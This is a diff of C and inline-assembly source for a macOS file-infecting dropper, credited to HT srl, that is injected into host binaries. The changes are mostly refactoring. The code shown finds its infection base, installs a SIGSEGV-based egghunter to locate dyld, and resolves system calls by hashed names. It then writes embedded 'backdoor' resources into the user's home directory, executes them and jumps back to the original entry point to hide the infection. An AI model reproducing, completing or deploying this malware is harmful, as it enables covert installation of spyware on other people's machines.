@@ -10,17 +10,9 @@
 *  - Get all the resources info, drop the files and execute the RESOURCE_CORE
 *  - Jump to the original entry point
 *
-*  - At the start of our dropper routine we need to save at least esp state,
-*    subtract our stack size in order to restore it to the original value before
-*    jumping to the original entry point.
-*    This is because after we have executed our dropped file we need to jump
-*    back to the original entryPoint which is, of course, another crt Start
-*    routine which expects a fresh register state (e.g. values that you get at
-*    the real first execution). If we don't restore esp properly we might loose
-*    our env of course, or even worst, we might generate a crash.
-*
 * Created by Alfredo 'revenge' Pesoli on 24/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009
+* Refactored & fixed by Guido Landi on 14/03/2012
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
@@ -55,7 +47,7 @@ void doExit ()
 {
 #ifdef WIN32
 	__asm__ __volatile__ {
-		xor		eax,eax
+			xor		eax,eax
 			push	eax
 			inc		eax
 			push	eax
@@ -75,8 +67,8 @@ void doExit ()
 static unsigned int
 sdbm (unsigned char *str)
 {
-	unsigned long hash = 0;
 	int c;
+	unsigned long hash = 0;
 
 	while ((c = *str++))
 		hash = c + (hash << 6) + (hash << 16) - hash;
@@ -106,13 +98,8 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 	struct segment_command *seg_command = NULL;
 	struct fat_header *f_header         = NULL;
 	struct fat_arch *f_arch             = NULL;
-
 	char *symbolName = NULL;
-
 	int offset, symbolOffset, stringOffset, x86Offset, found;
-
-	unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
-	//unsigned int hash, i, nfat;
 	unsigned int i, nfat;
 
 	offset = found = 0;
@@ -210,8 +197,6 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 		}
 
 		symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
-		//__asm__ __volatile__ { int 0x3 }
-		//hash = sdbm ((unsigned char *)symbolName);
 
 #ifdef LOADER_DEBUG_VERBOSE
 		printf ("[ii] SYMBOLFat: %s\n", symbolName);
@@ -224,10 +209,6 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 			printf ("[ii] SYMBOLFat: %s\n", symbolName);
 			printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
 #endif
-			// return the symbol address in the mmapped library
-			// + the image_base (x86 m_header)
-			//unsigned int symAddress = (unsigned int)(sym_nlist->n_value + (unsigned int)mh_header);
-			//return symAddress;
 			return sym_nlist->n_value;
 		}
 	}
@@ -248,7 +229,6 @@ findSymbol_snow (byte *imageBase, unsigned int symbolHash)
 
 	int offset, found, stringOffset; 
 
-	unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" hash
 	unsigned int hash, i;
 
 	offset = found = 0; 
@@ -270,18 +250,14 @@ findSymbol_snow (byte *imageBase, unsigned int symbolHash)
 			seg_command = (struct segment_command *)(imageBase + offset);
 
 			if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
-			{
 				found = 1;
-			}
 		}
 		else if (l_command->cmd == LC_SYMTAB)
 		{
 			sym_command = (struct symtab_command *)(imageBase + offset); 
 
 			if (found)
-			{
 				break;
-			}
 		}
 
 		offset += l_command->cmdsize;
@@ -328,7 +304,6 @@ findSymbol_lion(byte *imageBase, unsigned int symbolHash)
 
 	int offset, found, stringOffset;
 
-	unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" hash
 	unsigned int hash, i;
 
 	offset = found = 0; 
@@ -338,7 +313,6 @@ findSymbol_lion(byte *imageBase, unsigned int symbolHash)
 	for (i = 0; i < mh_header->ncmds; i++)
 	{
 		l_command = (struct load_command *)(imageBase + offset); 
-		//__asm__ __volatile__ { int 0x3 }
 
 		if (l_command->cmd == LC_SEGMENT)
 		{
@@ -436,8 +410,6 @@ void *mapLibSystem()
 	int err;
 
 	//fd = open("/usr/lib/libSystem.B.dylib", O_RDONLY);
-
-	// sub esp, 0x80
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x80
@@ -488,13 +460,13 @@ void *mapLibSystem()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-			mov eax, [fd]
+		mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-			xor eax, eax
-			mov al, 189
-			push eax
-			int 0x80
-			mov [err], eax
+		xor eax, eax
+		mov al, 189
+		push eax
+		int 0x80
+		mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -519,19 +491,19 @@ void *mapLibSystem()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-			mov DWORD PTR [esp+20], 0
-			mov eax, [fd]
+		mov DWORD PTR [esp+20], 0
+		mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-			mov DWORD PTR [esp+8], 1        // PROT_READ
-			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+		mov DWORD PTR [esp+8], 1        // PROT_READ
+		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-			mov DWORD PTR [esp], 0
-			xor eax, eax
-			mov al, 197
-			push eax
-			int 0x80
-			mov [address], eax
+		mov DWORD PTR [esp], 0
+		xor eax, eax
+		mov al, 197
+		push eax
+		int 0x80
+		mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -574,22 +546,22 @@ void *mapLibDyld()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x84
-			push 0x00000062
-			push 0x696c7964
-			push 0x2e646c79
-			push 0x6462696c
-			push 0x2f6d6574
-			push 0x7379732f
-			push 0x62696c2f
-			push 0x7273752f
-			mov edx, esp
-			push 0x0
-			push edx
-			xor eax, eax
-			mov al, 0x5
-			push eax
-			int 0x80
-			mov [fd], eax
+		push 0x00000062
+		push 0x696c7964
+		push 0x2e646c79
+		push 0x6462696c
+		push 0x2f6d6574
+		push 0x7379732f
+		push 0x62696c2f
+		push 0x7273752f
+		mov edx, esp
+		push 0x0
+		push edx
+		xor eax, eax
+		mov al, 0x5
+		push eax
+		int 0x80
+		mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -622,13 +594,13 @@ void *mapLibDyld()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-			mov eax, [fd]
+		mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-			xor eax, eax
-			mov al, 189
-			push eax
-			int 0x80
-			mov [err], eax
+		xor eax, eax
+		mov al, 189
+		push eax
+		int 0x80
+		mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -653,19 +625,19 @@ void *mapLibDyld()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-			mov DWORD PTR [esp+20], 0
-			mov eax, [fd]
+		mov DWORD PTR [esp+20], 0
+		mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-			mov DWORD PTR [esp+8], 1        // PROT_READ
-			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+		mov DWORD PTR [esp+8], 1        // PROT_READ
+		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-			mov DWORD PTR [esp], 0
-			xor eax, eax
-			mov al, 197
-			push eax
-			int 0x80
-			mov [address], eax
+		mov DWORD PTR [esp], 0
+		xor eax, eax
+		mov al, 197
+		push eax
+		int 0x80
+		mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -708,23 +680,23 @@ void *mapLibSystemC()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x88
-			push 0x00000062
-			push 0x696c7964
-			push 0x2e635f6d
-			push 0x65747379
-			push 0x7362696c
-			push 0x2f6d6574
-			push 0x7379732f
-			push 0x62696c2f
-			push 0x7273752f
-			mov edx, esp
-			push 0x0
-			push edx
-			xor eax, eax
-			mov al, 0x5
-			push eax
-			int 0x80
-			mov [fd], eax
+		push 0x00000062
+		push 0x696c7964
+		push 0x2e635f6d
+		push 0x65747379
+		push 0x7362696c
+		push 0x2f6d6574
+		push 0x7379732f
+		push 0x62696c2f
+		push 0x7273752f
+		mov edx, esp
+		push 0x0
+		push edx
+		xor eax, eax
+		mov al, 0x5
+		push eax
+		int 0x80
+		mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -757,13 +729,13 @@ void *mapLibSystemC()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-			mov eax, [fd]
+		mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-			xor eax, eax
-			mov al, 189
-			push eax
-			int 0x80
-			mov [err], eax
+		xor eax, eax
+		mov al, 189
+		push eax
+		int 0x80
+		mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -788,19 +760,19 @@ void *mapLibSystemC()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-			mov DWORD PTR [esp+20], 0
-			mov eax, [fd]
+		mov DWORD PTR [esp+20], 0
+		mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-			mov DWORD PTR [esp+8], 1        // PROT_READ
-			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+		mov DWORD PTR [esp+8], 1        // PROT_READ
+		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-			mov DWORD PTR [esp], 0
-			xor eax, eax
-			mov al, 197
-			push eax
-			int 0x80
-			mov [address], eax
+		mov DWORD PTR [esp], 0
+		xor eax, eax
+		mov al, 197
+		push eax
+		int 0x80
+		mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -843,24 +815,24 @@ void *mapLibSystemK()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		sub esp, 0x92
-			push 0x00006269
-			push 0x6c79642e
-			push 0x6c656e72
-			push 0x656b5f6d
-			push 0x65747379
-			push 0x7362696c
-			push 0x2f6d6574
-			push 0x7379732f
-			push 0x62696c2f
-			push 0x7273752f
-			mov edx, esp
-			push 0x0
-			push edx
-			xor eax, eax
-			mov al, 0x5
-			push eax
-			int 0x80
-			mov [fd], eax
+		push 0x00006269
+		push 0x6c79642e
+		push 0x6c656e72
+		push 0x656b5f6d
+		push 0x65747379
+		push 0x7362696c
+		push 0x2f6d6574
+		push 0x7379732f
+		push 0x62696c2f
+		push 0x7273752f
+		mov edx, esp
+		push 0x0
+		push edx
+		xor eax, eax
+		mov al, 0x5
+		push eax
+		int 0x80
+		mov [fd], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -893,13 +865,13 @@ void *mapLibSystemK()
 	__asm__ __volatile__ {
 		lea eax, [pad]
 		mov DWORD PTR [esp+0x4], eax // struct stat
-			mov eax, [fd]
+		mov eax, [fd]
 		mov DWORD PTR [esp], eax     // fd
-			xor eax, eax
-			mov al, 189
-			push eax
-			int 0x80
-			mov [err], eax
+		xor eax, eax
+		mov al, 189
+		push eax
+		int 0x80
+		mov [err], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -924,19 +896,19 @@ void *mapLibSystemK()
 #ifdef WIN32
 	__asm__ __volatile__ {
 		mov DWORD PTR [esp+24], 0
-			mov DWORD PTR [esp+20], 0
-			mov eax, [fd]
+		mov DWORD PTR [esp+20], 0
+		mov eax, [fd]
 		mov DWORD PTR [esp+16], eax
-			mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
-			mov DWORD PTR [esp+8], 1        // PROT_READ
-			mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
+		mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
+		mov DWORD PTR [esp+8], 1        // PROT_READ
+		mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
 		mov DWORD PTR [esp+4], eax
-			mov DWORD PTR [esp], 0
-			xor eax, eax
-			mov al, 197
-			push eax
-			int 0x80
-			mov [address], eax
+		mov DWORD PTR [esp], 0
+		xor eax, eax
+		mov al, 197
+		push eax
+		int 0x80
+		mov [address], eax
 	}
 #else
 	__asm__ __volatile__ (
@@ -968,10 +940,9 @@ void labelTest ()
 
 void secondStageDropper (unsigned long args)
 {
-	hijack_context *h_context = (hijack_context *)&args;
 	unsigned int fd;
+	hijack_context *h_context = (hijack_context *)&args; // "context" saved by pushad
 
-#ifdef WIN32
 	unsigned long _eax = h_context->eax;
 	unsigned long _ecx = h_context->ecx;
 	unsigned long _edx = h_context->edx;
@@ -980,7 +951,7 @@ void secondStageDropper (unsigned long args)
 	unsigned long _ebp = h_context->ebp;
 	unsigned long _esi = h_context->esi;
 	unsigned long _edi = h_context->edi;
-#endif
+
 	int crtStartSize = 54;
 	const char *imageName   = NULL;
 	void *baseAddress       = NULL;
@@ -1000,9 +971,9 @@ void secondStageDropper (unsigned long args)
 	sig_handler = osx_version = file_handle = read_len = i = 0;
 
 	__asm__ __volatile__ {
-		mov eax, [ebp+0x4]
-		sub eax, 0xD3
-		mov [infectionBase], eax
+		mov eax, [ebp+0x4]			// retaddr
+		sub eax, 0xD3				// infection base is 0xd3 bytes before retaddr
+		mov [infectionBase], eax	
 
 		jmp get_pc
 init:
@@ -1012,9 +983,9 @@ init:
 get_pc:
 		call init
 
-// this is weird, depending on stars allignment the context's offset 
-// and so we just scan the stack for a register we know it's not 
-// changed by the kernel(ebp)
+// this is weird, depending on some stars allignment the context's
+// offset changes and so we just scan the stack for a register we 
+// know it's not changed by the kernel(ebp)
 sig_handler:
 		mov eax, esp
 sig_loop:
@@ -1028,12 +999,13 @@ sig_loop:
 		// in the middle of the thread context
 	
 		sub [esp], 4		// make room for retaddr
-		mov eax, [esp]		// eax == faulting esp
+		mov eax, [esp]		
 
-		mov ebx, [esp+0xc]	// eax == faulting EIP
+		mov ebx, [esp+0xc]	// ebx == faulting EIP
 		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter
 		mov [eax], ebx		// save retaddr
 		
+		// restore registers & return back to the egghunter
 		mov eax, [esp-0x1c]
 		mov ebx, [esp-0x18]
 		mov ecx, [esp-0x14]
@@ -1054,16 +1026,16 @@ l_out:
 	// install sig_handler
 	__asm__ __volatile__ {
 		lea eax, [sig]
-		push 0
-		push eax
-		push 0xb
-		mov eax, 0x2e
+		push 0x0
+		push eax		// &sig
+		push 0xb		// SIGSEGV
+		mov eax, 0x2e	// SYS_sigaction
 		push eax
 		int 0x80
 		add esp, 0x10
 	}
 
-	// egghunter: scan for the first 0xfeedface from 
+	// egghunter: scans for the first 0xfeedface from 
 	// 0x8fe00000 to 0x8fff0000
 	__asm__ __volatile__ {
 		mov eax, 0x8fe00000
@@ -1084,28 +1056,28 @@ l_break:
 	// find macosx version
 	__asm__ __volatile__ {
 		push 0x0
-			push 0x7473696c
-			push 0x702e6e6f
-			push 0x69737265
-			push 0x566d6574
-			push 0x7379532f
-			push 0x73656369
-			push 0x76726553
-			push 0x65726f43
-			push 0x2f797261
-			push 0x7262694c
-			push 0x2f6d6574
-			push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
-			mov eax, esp
+		push 0x7473696c
+		push 0x702e6e6f
+		push 0x69737265
+		push 0x566d6574
+		push 0x7379532f
+		push 0x73656369
+		push 0x76726553
+		push 0x65726f43
+		push 0x2f797261
+		push 0x7262694c
+		push 0x2f6d6574
+		push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
+		mov eax, esp
 
-			push 0x0
-			push eax
-			mov eax, 0x5
-			push eax
-			int 0x80
-			mov [file_handle], eax
+		push 0x0
+		push eax
+		mov eax, 0x5
+		push eax
+		int 0x80
+		mov [file_handle], eax
 
-			add esp, 0x40
+		add esp, 0x40
 	}
 
 	if(file_handle <= 0)
@@ -1113,22 +1085,23 @@ l_break:
 
 	__asm__ __volatile__ {
 		push 0x400
-			lea eax, [file_buffer]
+		lea eax, [file_buffer]
 		push eax
-			mov eax, [file_handle]
+		mov eax, [file_handle]
 		push eax
-			mov eax, 0x3
+		mov eax, 0x3
 
-			push eax
-			int 0x80
-			mov [read_len], eax
+		push eax
+		int 0x80
+		mov [read_len], eax
 
-			add esp, 0x10
+		add esp, 0x10
 	}
 
 	if(read_len <= 0)
 		goto OEP_CALL;
 
+	// homebrew plist parsing FTW!
 	while(*(unsigned int *)&file_buffer[i++] != 0x696c702f && read_len > i) // "/pli"
 		if(*(unsigned int *)&file_buffer[i] == 0x2e30313e) // ">10."
 		{
@@ -1168,46 +1141,6 @@ l_break:
 #endif
 
 	//
-	// lib/function name hashes
-	//
-	unsigned int libSystemHash              = 0x7e38c256; // /usr/lib/libSystem.B.dylib
-	unsigned int libDyldHash                = 0x7c7cc5a8; // /usr/lib/system/libdyld.dylib
-	unsigned int libsystemcHash             = 0x80b1a6ae; // /usr/lib/system/libsystem_c.dylib (Lion)
-	unsigned int libsystemkHash             = 0xf1c2beb6; // /usr/lib/system/libsystem_kernel.dylib (Lion)
-
-	// libdyld.dylib
-	unsigned int dlsymHash                  = 0x9cc75880; // _dlsym
-	unsigned int dyld_image_countHash       = 0x9100a119; // __dyld_image_count
-	unsigned int dyld_get_image_nameHash    = 0x1327d26a; // __dyld_get_image_name
-	unsigned int dyld_get_image_headerHash  = 0xe8cdb2cc; // __dyld_get_image_header
-
-	// libsystem_kernel.dylib
-	unsigned int openHash     = 0x98b7a5e9; // _open
-	unsigned int lseekHash    = 0xfae127c5; // _lseek
-	unsigned int closeHash    = 0x56dcb9f9; // _close
-	unsigned int chdirHash    = 0x974cca09; // _chdir
-	unsigned int writeHash    = 0xb989adc0; // _write
-	unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
-	unsigned int statHash     = 0x54c725f3; // _stat
-	unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
-	unsigned int munmapHash   = 0x29d6b975; // _munmap
-	unsigned int mkdirHash    = 0xca1cf250; // _mkdir
-	unsigned int execveHash   = 0x9ca3dfdf; // _execve
-
-	// libsystem_c.dylib
-	unsigned int memcpyHash   = 0xb7ac6156; // _memcpy
-	unsigned int sprintfHash  = 0xf771588d; // _sprintf
-	unsigned int printfHash   = 0xb885c098; // _printf
-	unsigned int getenvHash   = 0x794bed96; // _getenv
-	unsigned int execlHash    = 0x80aa1fc;  // _execl
-	unsigned int forkHash     = 0xf58942e1; // _fork
-	unsigned int strncpyHash  = 0x335645d0; // _strncpy
-	unsigned int mallocHash   = 0x7de19fc7; // _malloc
-	unsigned int freeHash     = 0xf6f66e2b; // _free
-	unsigned int sleepHash    = 0x90a80b98; // _sleep
-	unsigned int sigactionHash = 0xa5bdf188; // _sigaction
-
-	//
 	// dyld function pointer prototypes
 	//
 	uint32_t (*_idyld_image_count)                        (void);
@@ -1217,28 +1150,28 @@ l_break:
 	//
 	// libSystem function pointer prototypes
 	//
-	int   (*iopen)     (const char *, int, ...);
-	long  (*ilseek)    (int, _mOff_t, int);
-	int   (*iclose)    (int);
-	int   (*ichdir)    (const char *);
-	int   (*iwrite)    (int, const void *, int);
-	int   (*ipwrite)   (int, const void *, int, _mOff_t);
-	int   (*istat)     (const char *, struct stat *);
-	void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
-	int   (*imunmap)   (void *, _mSize_t);
-	void *(*imemcpy)   (void *, const void *, int);
-	int   (*isprintf)  (char *, const char *, ...);
-	int   (*iprintf)   (const char *, ...);
-	char *(*igetenv)   (const char *);
-	int   (*imkdir)    (const char *, unsigned int);
-	int   (*iexecve)   (const char *, char *, char *);
-	int   (*iexecl)    (const char *, const char *, ...);
-	int   (*ifork)     (void);
-	char *(*istrncpy)  (char *, const char *, _mSize_t);
-	void *(*imalloc)   (int);
-	void  (*ifree)     (void *);
-	unsigned int (*isleep) (unsigned int);
-	int (*isigaction)	(int sig, sigaction *act, sigaction *oact);
+	int   (*iopen)			 (const char *, int, ...);
+	long  (*ilseek)			(int, _mOff_t, int);
+	int   (*iclose)			(int);
+	int   (*ichdir)			(const char *);
+	int   (*iwrite)			(int, const void *, int);
+	int   (*ipwrite)		(int, const void *, int, _mOff_t);
+	int   (*istat)			(const char *, struct stat *);
+	void *(*immap)			(void *, _mSize_t, int, int, int, _mOff_t);
+	int   (*imunmap)		(void *, _mSize_t);
+	void *(*imemcpy)		(void *, const void *, int);
+	int   (*isprintf)		(char *, const char *, ...);
+	int   (*iprintf)		(const char *, ...);
+	char *(*igetenv)		(const char *);
+	int   (*imkdir)			(const char *, unsigned int);
+	int   (*iexecve)		(const char *, char *, char *);
+	int   (*iexecl)			(const char *, const char *, ...);
+	int   (*ifork)			(void);
+	char *(*istrncpy)		(char *, const char *, _mSize_t);
+	void *(*imalloc)		(int);
+	void  (*ifree)			(void *);
+	unsigned int (*isleep)	(unsigned int);
+	int (*isigaction)		(int sig, sigaction *act, sigaction *oact);
 
 	void *libdyldAddress    = mapLibDyld();
 	void *libsystemcAddress = mapLibSystemC();
@@ -1294,9 +1227,7 @@ l_break:
 							libSystemAddress = mapLibSystem();
 
 							if (libSystemAddress == NULL)
-							{
 								doExit();
-							}
 
 							iopen     = (int   (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, openHash) + (unsigned int)m_header);
 							ilseek    = (long  (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
@@ -1341,9 +1272,7 @@ l_break:
 					if (hash == libsystemkHash)
 					{
 						if (libsystemkAddress == NULL)
-						{
-							doExit();
-						}
+							doExit(); // FIXME: OEP_CALL ?
 
 						iopen     = (int   (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libsystemkAddress, openHash) + (unsigned int)m_header);
 						ilseek    = (long  (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libsystemkAddress, lseekHash) + (unsigned int)m_header);
@@ -1360,9 +1289,7 @@ l_break:
 					else if (hash == libsystemcHash)
 					{
 						if (libsystemcAddress == NULL)
-						{
-							doExit();
-						}
+							doExit(); // OEP_CALL?? FIXME
 
 						imemcpy   = (void *(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libsystemcAddress, memcpyHash) + (unsigned int)m_header);
 						isprintf  = (int   (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libsystemcAddress, sprintfHash) + (unsigned int)m_header);
@@ -1381,7 +1308,8 @@ l_break:
 
 			// first restore signal handler
 			new_act.sig_action = 0; // SIG_DFL
-			isigaction(0xb, &new_act, &old_act);
+			isigaction(0xb, &new_act, &old_act); // 0xb == SIGSEGV
+
 #ifndef LOADER_DEBUG
 			for (i = 0; i < infection->numberOfStrings; i++)	
 			{
@@ -1390,28 +1318,23 @@ l_break:
 				stringList = (stringTable *)offset;
 			}
 
-			offset = (unsigned int)infectionBase
-				+ sizeof (infectionHeader)
-				+ sizeof (stringTable) * infection->numberOfStrings
-				+ infection->dropperSize
-				+ crtStartSize + 1;
-
 			void *envVariableName = (char *)strings[0];
 
 			if (igetenv != 0)
-			{
 				userHome = (char *) igetenv ((const char *)envVariableName);
-			}
 			else
-			{
-				errorOnInstall = 1;
-				//doExit();
-			}
+				errorOnInstall = 1; // FIXME: doExit() or goto EOPCALL
 
 			char *backdoorDropPath = (char *)imalloc(128);
 			isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);
 			backdoorPath = (char *)imalloc (256);
 			char *backdoorDir = NULL;
+
+			offset = (unsigned int)infectionBase
+				+ sizeof (infectionHeader)
+				+ sizeof (stringTable) * infection->numberOfStrings
+				+ infection->dropperSize
+				+ crtStartSize + 1;
 
 			//
 			// Cycle through and drop all the resources
@@ -1438,9 +1361,7 @@ l_break:
 					istrncpy (backdoorPath, destinationPath, 256);
 
 					if ((fd = iopen (destinationPath, O_CREAT | O_EXCL, 0755)) == -1)
-					{
 						backdoorIsAlreadyInstalled = 1;
-					}
 				}
 
 				int resSize = resource->size;
@@ -1449,9 +1370,7 @@ l_break:
 				if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
 				{
 					if (iwrite (fd, (const void *)offset, resSize) == -1)
-					{
 						errorOnInstall = 1;
-					}
 
 					iclose (fd);
 				}
@@ -1492,7 +1411,7 @@ l_break:
 OEP_CALL:
 #ifdef WIN32
 			// Here we have to remove the fixed base (0x1000) and add
-			// the randomized one (dyldBaseAddress)			
+			// the randomized one 	
 			uint32_t baseAddress = (uint32_t)_idyld_get_image_header(0);
 			uint32_t originalEP = infection->originalEP - 0x1000 + (uint32_t)baseAddress;
 
@@ -1532,16 +1451,6 @@ OEP_CALL:
 		}
 	}
 }
-
-#ifdef LOADER_DEBUG
-/*
-int main()
-{
-secondStageDropper();
-return 0;
-}
-*/
-#endif
 
 void dropperEnd ()
 {
